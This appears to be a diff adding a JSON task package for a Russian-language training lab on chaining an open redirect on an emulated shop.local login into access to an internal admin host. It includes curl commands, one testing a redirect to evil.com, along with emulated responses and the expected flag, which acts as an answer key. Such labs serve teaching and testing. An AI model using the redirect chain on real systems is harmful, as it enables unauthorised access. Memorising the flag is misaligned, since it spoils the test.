@@ -1,0 +1,22 @@
+{
+  "id": "web-xss-client-side",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{0p3n_r3d1r3ct_ch41ns_t0_1nt3rn4l_4dm1n}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: open redirect как мост внутрь\n\nПосле входа сайт редиректит по параметру `next`:\n\n```\nhttps://shop.local/login?next=/profile\n```\n\nСам open redirect «низкий», но это мост: внутренний админ-хост доверяет\nредиректу со своего домена.\n\n1. Легитимный редирект:\n\n   curl -sI 'https://shop.local/login?next=/profile' | grep -i location\n\n2. Чужой домен принимается?\n\n   curl -sI 'https://shop.local/login?next=https://evil.com' | grep -i location\n\n3. Протокол-относительный редирект на внутренний хост. Пройди по нему\n   (`-L`) — внутренний админ отдаст страницу с флагом:\n\n   curl -sL 'https://shop.local/login?next=//internal.shop.local/admin' > found.txt\n\n4. Набери `check`.\n" }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.local/login и внутреннего хоста)",
+      "cases": [
+        { "match": "internal\\.shop\\.local", "example": "-sL 'https://shop.local/login?next=//internal.shop.local/admin'", "output": "HTTP/1.1 302 Found\nLocation: //internal.shop.local/admin\n\nHTTP/1.1 200 OK\nContent-Type: text/html\n\n<h1>Internal admin</h1>\n<p>flag: nto{0p3n_r3d1r3ct_ch41ns_t0_1nt3rn4l_4dm1n}</p>\n" },
+        { "match": "next=https?://evil|evil\\.com", "example": "-sI 'https://shop.local/login?next=https://evil.com'", "output": "HTTP/1.1 302 Found\nLocation: https://evil.com\n" },
+        { "match": "next=/profile", "example": "-sI 'https://shop.local/login?next=/profile'", "output": "HTTP/1.1 302 Found\nLocation: /profile\n" },
+        { "match": "login", "example": "-sI 'https://shop.local/login'", "output": "HTTP/1.1 200 OK\nContent-Type: text/html\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только https://shop.local/login?next=...\n"
+    }
+  }
+}
